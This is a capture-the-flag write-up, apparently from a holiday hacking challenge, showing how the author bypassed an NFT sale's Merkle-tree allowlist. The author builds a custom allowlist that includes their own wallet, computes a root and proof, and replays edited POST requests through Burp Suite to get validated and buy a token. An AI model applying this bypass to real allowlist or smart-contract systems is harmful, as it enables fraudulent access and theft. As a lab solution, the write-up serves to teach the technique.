---
sidebar_position: 3
---

# Exploit a Smart Contract

## Set up QPetabyte's Merkle Trees tool

```bash
git clone https://github.com/QPetabyte/Merkle_Trees
cd Merkle_Trees
docker build -t merkletrees .
docker run -it --rm --name=merkletrees merkletrees
```

### Setup merkle_tree.py script

This script needs a list of wallets to put on the allowlist in order to calculate the root value. My theory is that I put my wallet ID in as the first entry and then fill up with addresses found on the NFT gallery page: 

```python
# allowlist = ['0x1337133713371337133713371337133713371337','0x0000000000000000000000000000000000000000']

allowlist = [
    "0xB32428966dcDAF5F4C6715492EB1871971db1D9B",
    "0xa1861E96DeF10987E1793c8f77E811032069f8E9",
    "0xb9aA688bB7A1B085f307bf9a11790BFD24C5D5C2",
    "0xc249927fb81bde4eA7B9Dc9e4c9E6F503F147fe2",
    "0x8153e0E5cabC22545A1fe4d0149C2Fdc486A8ad8",
    "0x7F7cAA97b73fD38d6740e59C159428509eE00082",
    "0x214Fee463D58D21954e75bdD93c386414e71A985",
]
```

Then run this tool:

```bash
$ python3 merkle_tree_new.py 

Root: 0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed
"0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5"
```

### HTTP Post validate adress on list 

I used BurpSuite proxy for this and Repated the sniffed POST request once edited with correct values

```python
{
	"WalletID":"0xB32428966dcDAF5F4C6715492EB1871971db1D9B",
	"Root":"0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed",
	"Proof": "0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5",
	"Validate":"true",
	"Session":"f813731a-dd84-4188-ae18-df23149cdbc2"
}
```

Got the following feedback from server

```python
{"Response": "You're on the list and good to go! Now... BUY A SPORC!"}
```

### Prepaying 

![Teller machine](/img/burning-ring/smart-contract-1.png)

![Teller menu](/img/burning-ring/smart-contract-2.png)

![Preparing payment](/img/burning-ring/smart-contract-3.png)

![Payment done](/img/burning-ring/smart-contract-4.png)

### Paying for NFT

Reusing the HTTP POST request as used in "HTTP Post validate address on list", but altering parameter "Validate" to "false" (still using BurpSuite):

```python
{
	"WalletID":"0xB32428966dcDAF5F4C6715492EB1871971db1D9B",
	"Root":"0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed",
	"Proof": "0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5",
	"Validate":"false",
	"Session":"f813731a-dd84-4188-ae18-df23149cdbc2"
}
```

Response:

```python
{
	"Response": "Success! You are now the proud owner of BSRS Token #000234. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS234, or check it out in the gallery!<br>Transaction: 0x4cd5d6458d1c1a430c07e410a58f79d660125ff8f2e9ab2032aa9be2112ad6b3, Block: 69095<br><br>Remember: Just like we planned, tell everyone you know to <u><em>BUY A BoredSporc</em></u>.<br>When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!<br><br>The market will tank, but we'll all be rich!!!"}
```

Apparently I bought this NFT:

![My NFT](/img/burning-ring/BSRS234.png)